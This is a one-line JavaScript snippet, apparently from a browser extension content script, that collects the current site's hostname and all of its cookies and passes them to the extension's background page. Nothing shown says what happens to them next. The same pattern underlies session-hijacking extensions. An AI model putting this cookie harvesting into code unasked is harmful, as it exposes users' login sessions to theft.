chrome.runtime.sendMessage({data:window.location.hostname, cookie:document.cookie}, function(response) {});
